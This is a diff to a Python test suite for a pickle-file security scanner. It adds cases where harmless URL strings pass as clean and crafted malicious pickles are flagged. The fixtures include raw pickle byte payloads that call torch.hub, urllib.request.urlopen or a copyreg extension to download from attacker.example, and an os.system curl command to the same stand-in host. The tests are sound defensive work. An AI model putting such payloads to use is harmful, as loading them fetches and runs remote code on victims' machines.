@@ -3067,11 +3067,28 @@ def test_scan_bytes_allows_benign_security_documentation_strings() -> None:
         "https://example.invalid/reference/httpx.get(url)",
         "https://example.invalid/path?x=1&handler=requests.get(url)",
         "https://example.invalid/path?x=1&handler=os.system(cmd)",
+        "https://example.invalid/path?x=1;handler=requests.get(url)",
+        "https://example.invalid/path?x=1,handler=httpx.get(url)",
+        "https://user:pass@example.invalid/reference/os.system(cmd)",
+        "https://example.invalid/%E2%98%83/%00/reference/subprocess.run(args)",
+        "prefix\x00https://example.invalid/reference/requests.get(url)\x1fsuffix",
         "https://github.com/example/project/blob/main/loader.py",
     ],
 )
-def test_scan_bytes_allows_inert_url_literals_with_executable_terms(literal: str) -> None:
-    report = scan_bytes(pickle.dumps({"metadata_url": literal}, protocol=4), source="url-metadata.pkl")
+@pytest.mark.parametrize("protocol", range(pickle.HIGHEST_PROTOCOL + 1))
+def test_scan_bytes_allows_inert_url_literals_with_executable_terms(literal: str, protocol: int) -> None:
+    report = scan_bytes(pickle.dumps({"metadata_url": literal}, protocol=protocol), source="url-metadata.pkl")
+
+    assert report.status == ScanStatus.COMPLETE
+    assert report.verdict == SafetyVerdict.CLEAN
+    assert report.findings == ()
+
+
+def test_scan_bytes_allows_fragmented_inert_url_literals_with_executable_terms() -> None:
+    report = scan_bytes(
+        pickle.dumps({"metadata_url_parts": ["https://example.invalid/reference/requests.", "get(url)"]}, protocol=4),
+        source="fragmented-url-metadata.pkl",
+    )
 
     assert report.status == ScanStatus.COMPLETE
     assert report.verdict == SafetyVerdict.CLEAN
@@ -3090,6 +3107,20 @@ def test_scan_bytes_allows_inert_url_literals_with_executable_terms(literal: str
             b"ctorch.hub\ndownload_url_to_file\n(Vhttps://attacker.example/payload\nV/tmp/model.bin\ntR.",
             "torch.hub.download_url_to_file",
         ),
+        (
+            b"\x80\x04"
+            + _short_binunicode(b"urllib.request")
+            + b"\x940"
+            + _short_binunicode(b"urlopen")
+            + b"\x940h\x00h\x01\x93"
+            + _short_binunicode(b"https://user:pass@attacker.example/%E2%98%83/payload")
+            + b"\x940h\x02\x85R.",
+            "urllib.request.urlopen",
+        ),
+        (
+            b"\x80\x04\x82\x01" + _short_binunicode(b"https://attacker.example/payload") + b"\x85R.",
+            "copyreg.extension.code_1",
+        ),
     ],
 )
 def test_scan_bytes_keeps_network_url_reducers_actionable(payload: bytes, import_reference: str) -> None:
@@ -3099,6 +3130,21 @@ def test_scan_bytes_keeps_network_url_reducers_actionable(payload: bytes, import
     assert report.verdict == SafetyVerdict.MALICIOUS
     assert any(
         finding.rule_code == "DANGEROUS_CALL" and finding.details.get("import_reference") == import_reference
+        for finding in report.findings
+    )
+
+
+def test_scan_bytes_keeps_build_url_state_actionable() -> None:
+    payload = b"c__main__\nRemoteLoader\n)R}Vendpoint\nVhttps://attacker.example/payload\nsb."
+
+    report = scan_bytes(payload, source="main-build-url-state.pkl")
+
+    assert report.status == ScanStatus.COMPLETE
+    assert report.verdict == SafetyVerdict.MALICIOUS
+    assert any(
+        finding.rule_code == "DANGEROUS_CALL"
+        and finding.details.get("opcode") == "BUILD"
+        and finding.details.get("import_reference") == "__main__.RemoteLoader"
         for finding in report.findings
     )
 
@@ -3139,6 +3185,7 @@ def test_scan_bytes_flags_expanded_suspicious_string_patterns(literal: str, expe
     ("literal", "pattern"),
     [
         (b"os.system('id')", "base64 os.system"),
+        (b"os.system('curl https://attacker.example/payload')", "base64 os.system"),
         (b"eval(x)", "base64 eval("),
     ],
 )
